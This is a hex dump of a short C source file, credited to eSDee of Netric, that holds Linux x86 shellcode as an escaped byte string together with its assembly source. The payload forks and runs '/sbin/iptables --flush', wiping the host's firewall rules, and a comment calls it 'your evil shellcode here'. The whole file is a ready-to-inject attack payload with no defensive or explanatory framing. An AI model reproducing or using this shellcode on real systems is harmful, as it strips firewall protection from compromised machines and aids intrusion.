00000000  2f 2a 20 6c 69 6e 75 78  20 78 38 36 20 73 68 65  |/* linux x86 she|
00000010  6c 6c 63 6f 64 65 20 62  79 20 65 53 44 65 65 20  |llcode by eSDee |
00000020  6f 66 20 4e 65 74 72 69  63 20 28 77 77 77 2e 6e  |of Netric (www.n|
00000030  65 74 72 69 63 2e 6f 72  67 29 0d 0a 20 2a 20 2f  |etric.org).. * /|
00000040  73 62 69 6e 2f 69 70 74  61 62 6c 65 73 20 2d 2d  |sbin/iptables --|
00000050  66 6c 75 73 68 0d 0a 20  2a 2f 0d 0a 0d 0a 63 68  |flush.. */....ch|
00000060  61 72 0d 0a 6d 61 69 6e  5b 5d 20 3d 0d 0a 20 20  |ar..main[] =..  |
00000070  20 20 20 20 20 20 22 5c  78 33 31 5c 78 63 30 5c  |      "\x31\xc0\|
00000080  78 33 31 5c 78 64 62 5c  78 62 30 5c 78 30 32 5c  |x31\xdb\xb0\x02\|
00000090  78 63 64 5c 78 38 30 22  0d 0a 20 20 20 20 20 20  |xcd\x80"..      |
000000a0  20 20 22 5c 78 33 39 5c  78 64 38 5c 78 37 35 5c  |  "\x39\xd8\x75\|
000000b0  78 32 64 5c 78 33 31 5c  78 63 30 5c 78 35 30 5c  |x2d\x31\xc0\x50\|
000000c0  78 36 36 22 0d 0a 20 20  20 20 20 20 20 20 22 5c  |x66"..        "\|
000000d0  78 36 38 5c 78 32 64 5c  78 34 36 5c 78 38 39 5c  |x68\x2d\x46\x89\|
000000e0  78 65 36 5c 78 35 30 5c  78 36 38 5c 78 36 32 22  |xe6\x50\x68\x62"|
000000f0  0d 0a 20 20 20 20 20 20  20 20 22 5c 78 36 63 5c  |..        "\x6c\|
00000100  78 36 35 5c 78 37 33 5c  78 36 38 5c 78 36 39 5c  |x65\x73\x68\x69\|
00000110  78 37 30 5c 78 37 34 5c  78 36 31 22 0d 0a 20 20  |x70\x74\x61"..  |
00000120  20 20 20 20 20 20 22 5c  78 36 38 5c 78 36 32 5c  |      "\x68\x62\|
00000130  78 36 39 5c 78 36 65 5c  78 32 66 5c 78 36 38 5c  |x69\x6e\x2f\x68\|
00000140  78 32 66 5c 78 32 66 22  0d 0a 20 20 20 20 20 20  |x2f\x2f"..      |
00000150  20 20 22 5c 78 32 66 5c  78 37 33 5c 78 38 39 5c  |  "\x2f\x73\x89\|
00000160  78 65 33 5c 78 38 64 5c  78 35 34 5c 78 32 34 5c  |xe3\x8d\x54\x24\|
00000170  78 31 30 22 0d 0a 20 20  20 20 20 20 20 20 22 5c  |x10"..        "\|
00000180  78 35 30 5c 78 35 36 5c  78 35 34 5c 78 38 39 5c  |x50\x56\x54\x89\|
00000190  78 65 31 5c 78 62 30 5c  78 30 62 5c 78 63 64 22  |xe1\xb0\x0b\xcd"|
000001a0  0d 0a 20 20 20 20 20 20  20 20 22 5c 78 38 30 5c  |..        "\x80\|
000001b0  78 38 39 5c 78 63 33 5c  78 33 31 5c 78 63 30 5c  |x89\xc3\x31\xc0\|
000001c0  78 33 31 5c 78 63 39 5c  78 33 31 22 0d 0a 20 20  |x31\xc9\x31"..  |
000001d0  20 20 20 20 20 20 22 5c  78 64 32 5c 78 62 30 5c  |      "\xd2\xb0\|
000001e0  78 30 37 5c 78 63 64 5c  78 38 30 22 3b 20 0d 0a  |x07\xcd\x80"; ..|
000001f0  0d 0a 20 20 20 20 20 20  20 20 2f 2a 20 79 6f 75  |..        /* you|
00000200  72 20 65 76 69 6c 20 73  68 65 6c 6c 63 6f 64 65  |r evil shellcode|
00000210  20 68 65 72 65 20 2a 2f  0d 0a 0d 0a 69 6e 74 20  | here */....int |
00000220  0d 0a 61 73 6d 5f 63 6f  64 65 28 29 0d 0a 7b 0d  |..asm_code()..{.|
00000230  0a 20 20 20 20 20 20 20  20 5f 5f 61 73 6d 28 22  |.        __asm("|
00000240  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |..              |
00000250  20 20 78 6f 72 6c 20 25  65 61 78 2c 25 65 61 78  |  xorl %eax,%eax|
00000260  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |..              |
00000270  20 20 78 6f 72 6c 20 25  65 62 78 2c 25 65 62 78  |  xorl %ebx,%ebx|
00000280  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |..              |
00000290  20 20 6d 6f 76 62 20 24  32 2c 20 25 61 6c 0d 0a  |  movb $2, %al..|
000002a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000002b0  69 6e 74 20 24 30 78 30  38 30 0d 0a 20 20 20 20  |int $0x080..    |
000002c0  20 20 20 20 20 20 20 20  20 20 20 20 63 6d 70 6c  |            cmpl|
000002d0  20 25 65 62 78 2c 25 65  61 78 0d 0a 20 20 20 20  | %ebx,%eax..    |
000002e0  20 20 20 20 20 20 20 20  20 20 20 20 6a 6e 65 20  |            jne |
000002f0  57 41 49 54 0d 0a 0d 0a  20 20 20 20 20 20 20 20  |WAIT....        |
00000300  20 20 20 20 20 20 20 20  78 6f 72 6c 20 20 25 65  |        xorl  %e|
00000310  61 78 2c 25 65 61 78 0d  0a 20 20 20 20 20 20 20  |ax,%eax..       |
00000320  20 20 20 20 20 20 20 20  20 70 75 73 68 6c 20 25  |         pushl %|
00000330  65 61 78 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |eax..           |
00000340  20 20 20 20 20 70 75 73  68 77 20 24 30 78 34 36  |     pushw $0x46|
00000350  32 64 0d 0a 20 20 20 20  20 20 20 20 20 20 20 20  |2d..            |
00000360  20 20 20 20 6d 6f 76 6c  20 25 65 73 70 2c 25 65  |    movl %esp,%e|
00000370  73 69 0d 0a 20 20 20 20  20 20 20 20 20 20 20 20  |si..            |
00000380  20 20 20 20 70 75 73 68  6c 20 25 65 61 78 0d 0a  |    pushl %eax..|
00000390  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000003a0  70 75 73 68 6c 20 24 30  78 37 33 36 35 36 63 36  |pushl $0x73656c6|
000003b0  32 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |2..             |
000003c0  20 20 20 70 75 73 68 6c  20 24 30 78 36 31 37 34  |   pushl $0x6174|
000003d0  37 30 36 39 0d 0a 20 20  20 20 20 20 20 20 20 20  |7069..          |
000003e0  20 20 20 20 20 20 70 75  73 68 6c 20 24 30 78 32  |      pushl $0x2|
000003f0  66 36 65 36 39 36 32 0d  0a 20 20 20 20 20 20 20  |f6e6962..       |
00000400  20 20 20 20 20 20 20 20  20 70 75 73 68 6c 20 24  |         pushl $|
00000410  30 78 37 33 32 66 32 66  32 66 0d 0a 20 20 20 20  |0x732f2f2f..    |
00000420  20 20 20 20 20 20 20 20  20 20 20 20 6d 6f 76 6c  |            movl|
00000430  20 20 20 25 65 73 70 2c  25 65 62 78 0d 0a 20 20  |   %esp,%ebx..  |
00000440  20 20 20 20 20 20 20 20  20 20 20 20 20 20 6c 65  |              le|
00000450  61 6c 20 20 20 30 78 31  30 28 25 65 73 70 29 2c  |al   0x10(%esp),|
00000460  25 65 64 78 0d 0a 20 20  20 20 20 20 20 20 20 20  |%edx..          |
00000470  20 20 20 20 20 20 70 75  73 68 6c 20 20 25 65 61  |      pushl  %ea|
00000480  78 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |x..             |
00000490  20 20 20 70 75 73 68 6c  20 20 25 65 73 69 0d 0a  |   pushl  %esi..|
000004a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000004b0  70 75 73 68 6c 20 20 25  65 73 70 0d 0a 20 20 20  |pushl  %esp..   |
000004c0  20 20 20 20 20 20 20 20  20 20 20 20 20 6d 6f 76  |             mov|
000004d0  6c 20 20 20 25 65 73 70  2c 25 65 63 78 0d 0a 20  |l   %esp,%ecx.. |
000004e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 6d  |               m|
000004f0  6f 76 62 20 20 20 24 30  78 62 2c 25 61 6c 0d 0a  |ovb   $0xb,%al..|
00000500  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000510  69 6e 74 20 20 20 20 24  30 78 38 30 0d 0a 0d 0a  |int    $0x80....|
00000520  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000530  57 41 49 54 3a 0d 0a 20  20 20 20 20 20 20 20 20  |WAIT:..         |
00000540  20 20 20 20 20 20 20 6d  6f 76 6c 20 25 65 61 78  |       movl %eax|
00000550  2c 20 25 65 62 78 0d 0a  20 20 20 20 20 20 20 20  |, %ebx..        |
00000560  20 20 20 20 20 20 20 20  78 6f 72 6c 20 25 65 61  |        xorl %ea|
00000570  78 2c 20 25 65 61 78 0d  0a 20 20 20 20 20 20 20  |x, %eax..       |
00000580  20 20 20 20 20 20 20 20  20 78 6f 72 6c 20 25 65  |         xorl %e|
00000590  63 78 2c 20 25 65 63 78  0d 0a 20 20 20 20 20 20  |cx, %ecx..      |
000005a0  20 20 20 20 20 20 20 20  20 20 78 6f 72 6c 20 25  |          xorl %|
000005b0  65 64 78 2c 20 25 65 64  78 0d 0a 20 20 20 20 20  |edx, %edx..     |
000005c0  20 20 20 20 20 20 20 20  20 20 20 6d 6f 76 62 20  |           movb |
000005d0  24 37 2c 20 25 61 6c 0d  0a 20 20 20 20 20 20 20  |$7, %al..       |
000005e0  20 20 20 20 20 20 20 20  20 69 6e 74 20 24 30 78  |         int $0x|
000005f0  38 30 0d 0a 20 20 20 20  20 20 20 20 20 20 20 20  |80..            |
00000600  20 20 20 20 22 29 3b 0d  0a 0d 0a 7d              |    ");....}|
0000060c
